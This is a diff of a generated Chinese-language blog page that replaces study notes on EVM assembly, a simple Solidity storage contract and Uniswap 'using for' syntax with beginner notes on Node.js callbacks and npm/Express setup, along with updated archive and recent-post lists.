-<p>调完了tag12，memory有变化，可以说这里的80是为了在这里存数据用的<br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-27.png" alt="Alt text"><br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-23.png" alt="Alt text"></p>
-<p>跳完了tag15，<br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-25.png" alt="Alt text"><br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-26.png" alt="Alt text"></p>
-<p>跳完了tag6<br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-28.png" alt="Alt text"><br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-29.png" alt="Alt text"></p>
-<p>总结：大多数冗余的操作都是因为jump需要，执行的最多的就是jump，pop，push</p>
-<hr>
-<p><a target="_blank" rel="noopener" href="https://ethereum.stackexchange.com/questions/135183/why-is-there-a-log-opcode-being-created-from-my-solidity-code-when-i-dont-hav">第二篇代码</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.15;</span><br><span class="line"></span><br><span class="line">contract SSimpleStorage &#123;</span><br><span class="line">    uint256 storedNumber;</span><br><span class="line"></span><br><span class="line">    function storeNumber(uint256 newNumber) external &#123;</span><br><span class="line">        storedNumber = newNumber;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function readNumber() external view returns (uint256) &#123;</span><br><span class="line">        return storedNumber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+        <p>callback function:</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://oo90909.github.io/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/" data-id="clriklc7n000ln4ud19f5e9k3" data-title="assembly" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://oo90909.github.io/2023/12/13/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/nodejs%E8%AF%AD%E6%B3%95/" data-id="clt84owbr0012dkud3jy48mzn" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -489,78 +429,27 @@
 
 
   
-    <article id="post-readme/关于写博客的规定" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-区块链开发/ERC721/express" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2023/11/20/readme/%E5%85%B3%E4%BA%8E%E5%86%99%E5%8D%9A%E5%AE%A2%E7%9A%84%E8%A7%84%E5%AE%9A/" class="article-date">
-  <time class="dt-published" datetime="2023-11-20T05:01:54.817Z" itemprop="datePublished">2023-11-20</time>
+    <a href="/2023/12/12/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/express/" class="article-date">
+  <time class="dt-published" datetime="2023-12-12T12:55:51.634Z" itemprop="datePublished">2023-12-12</time>
 </a>
     
   </div>
   <div class="article-inner">
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/11/20/readme/%E5%85%B3%E4%BA%8E%E5%86%99%E5%8D%9A%E5%AE%A2%E7%9A%84%E8%A7%84%E5%AE%9A/">博客规定</a>
-    </h1>
-  
-
-      </header>
-    
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>博客的文件夹属于完全分类法，学习的知识、工具第一次在哪个靶场接触到，就严格将这些东西放在对应的靶场文件夹下面</p>
-<p>如果接触的这个工具或者知识不属于任何一个靶场，则写到<strong>其他</strong>文件夹里面</p>
+        <p><a target="_blank" rel="noopener" href="https://nodejs.org/en/learn/asynchronous-work/javascript-asynchronous-programming-and-callbacks">异步</a></p>
+<p>javaScript是同步的，并且没有创建多个进程的方法，但其他语言有</p>
+<p>安装过程：<br>打开npmjs，搜索express，可以看到express的库和相关命令<br>npm init:初始化，生成一个package.json文件<br><img src="/2023/12/12/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/express/image.png" alt="Alt text"></p>
+<p><img src="/2023/12/12/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/express/image-1.png" alt="Alt text"><br>scripts：比如，用npx run test 命令就会自动运行                  echo &quot;Error: no test specified&quot; &amp;&amp; exit 1</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://oo90909.github.io/2023/11/20/readme/%E5%85%B3%E4%BA%8E%E5%86%99%E5%8D%9A%E5%AE%A2%E7%9A%84%E8%A7%84%E5%AE%9A/" data-id="clriklc7f0004n4udera435qk" data-title="博客规定" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-区块链安全/defi靶场/uniswap2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/defi%E9%9D%B6%E5%9C%BA/uniswap2/" class="article-date">
-  <time class="dt-published" datetime="2023-11-20T04:58:22.969Z" itemprop="datePublished">2023-11-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/defi%E9%9D%B6%E5%9C%BA/uniswap2/">uniswap2</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>发现一个东西：<br>using for 中的对象会充当使用的方法的第一个参数</p>
-<p><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/defi%E9%9D%B6%E5%9C%BA/uniswap2/image.png" alt="Alt text"></p>
-<p>明明这里有两个参数，但是调用的时候只传入了一个参数</p>
-<p><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/defi%E9%9D%B6%E5%9C%BA/uniswap2/image-1.png" alt="Alt text"></p>
-<p>这里是先减再乘</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://oo90909.github.io/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/defi%E9%9D%B6%E5%9C%BA/uniswap2/" data-id="clriklc7j000fn4ud5k0p7axd" data-title="uniswap2" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://oo90909.github.io/2023/12/12/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/express/" data-id="clt84owbo000zdkud57dm1v3n" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -576,7 +465,7 @@
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -595,7 +484,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li></ul>
     </div>
   </div>
 
@@ -608,23 +497,23 @@
       <ul>
         
           <li>
-            <a href="/2024/01/15/readme/%E9%9D%A2%E8%AF%95/">面试</a>
+            <a href="/2024/02/22/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%9B%B8%E5%85%B3/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2024/01/13/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/create2/">create2</a>
+            <a href="/2024/02/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/solidity%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2024/01/13/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/decompile/">(no title)</a>
+            <a href="/2024/02/06/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/defi%E9%9D%B6%E5%9C%BA/uniswap2Core/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2024/01/08/%E6%9D%82%E6%96%87/%E6%AF%9B%E6%B3%BD%E4%B8%9C/">(no title)</a>
+            <a href="/2024/01/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Dos/">checkContract</a>
           </li>
         
           <li>
-            <a href="/2024/01/07/hello-world/">Hello World</a>
+            <a href="/2024/01/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/checkContract/">checkContract</a>
           </li>
         
       </ul>
